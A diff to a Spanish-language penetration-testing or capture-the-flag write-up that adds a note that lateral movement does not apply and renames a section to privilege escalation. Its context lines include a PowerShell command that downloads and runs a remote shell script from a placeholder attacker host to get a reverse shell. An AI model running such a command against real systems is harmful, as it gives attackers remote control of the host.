@@ -99,7 +99,12 @@ Para una shell inversa se cambia el `Exec` por una descarga en memoria:
 powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/shell.ps1')
 ```
 
-## Escalada
+## Movimiento lateral
+
+- No aplica: la cadena se resuelve en un único host, sin salto lateral.
+- Ver «Escalada de privilegios» para el paso de usuario a administrador.
+
+## Escalada de privilegios
 
 ```powershell
 whoami /priv
